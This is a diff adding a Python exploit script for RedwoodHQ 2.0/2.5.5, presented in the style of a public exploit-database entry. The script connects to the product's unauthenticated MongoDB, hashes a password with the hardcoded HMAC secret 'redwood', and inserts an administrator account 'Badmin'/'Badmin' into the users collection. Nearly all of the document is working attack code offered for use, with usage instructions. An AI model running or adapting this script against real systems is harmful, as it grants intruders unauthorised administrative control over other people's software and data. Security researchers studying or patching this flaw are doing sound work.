@@ -1,0 +1,78 @@
+# -*- encoding: utf-8 -*-
+#!/usr/bin/python3
+
+# Exploit Title:   RedxploitHQ (Create Admin User by missing authentication on db)
+# Date: 	       14-june-2019
+# Exploit Author:  EthicalHCOP
+# Version: 	       2.0 / 2.5.5
+# Vendor Homepage: https://redwoodhq.com/
+# Software Link:   https://redwoodhq.com/redwood-download/
+# Tested on: 	   Ubuntu and Windows.
+# Twitter:	       @EthicalHcop
+# Usage:           python3 RedxploitHQ.py -H mongo_host -P mongo_port
+# Description: 	   Use RedxploitHQ to create a new Admin user into redwoodhq and get all the functions on the framework
+# 
+# RedwoodHQ doesn't require that MongoDB is installed on the machine because this tool have  her own Mongo Launcher. 
+# The problem is that this vendor database doesn't require any authentication to read her data. 
+# So, I use the same syntax that use the Framework to create my admin user on the database and access into the tool
+# 
+# POC:             https://youtu.be/MK9AvoJDtxY
+
+import hashlib
+import hmac
+import optparse
+from pymongo import MongoClient
+
+def CreateHMAC(Pass):
+    message = bytes(Pass,encoding='utf8')
+    secret = bytes('redwood',encoding='utf8')
+    hash = hmac.new(secret, message, hashlib.md5)
+    return (hash.hexdigest())
+
+def DbConnect(ip,port):
+    uri = "mongodb://" + ip + ":" + port + "/"
+    con = MongoClient(uri)
+    return con
+
+def DbDisconnect(con):
+    con.close()
+
+def CreateBadminUser(ip, port, user, passw):
+    con = DbConnect(ip, port)
+    db = con.automationframework
+    usr = db.users
+    passw = CreateHMAC(passw)
+    data = {
+        "name": user,
+        "password": passw,
+        "tag": [],
+        "role": "Admin",
+        "username": user,
+        "status": ""
+    }
+    usr.insert_one(data)
+    DbDisconnect(con)
+
+def start():
+    parser = optparse.OptionParser('usage %prog ' + \
+                                   '-H host -P port')
+    parser.add_option('-P', '--Port', dest='port', type='string', \
+                      help='MongoDB Port')
+    parser.add_option('-H', '--Host', dest='host', type='string', \
+                      help='MongoDB Host')
+    (options, args) = parser.parse_args()
+    ip = options.host
+    port = options.port
+    if (str(ip) == "None"):
+        print("Insert Host")
+        exit(0)
+    if (str(port) == "None"):
+        port = "27017"
+    try:
+        CreateBadminUser(str(ip), str(port), 'Badmin', 'Badmin')
+        print("[+] New user 'Badmin'/'Badmin' created.")
+    except Exception as e:
+        print("[-] Can't create the 'Badmin'/'Badmin' user. Error: "+str(e))
+
+if __name__ == '__main__':
+    start()
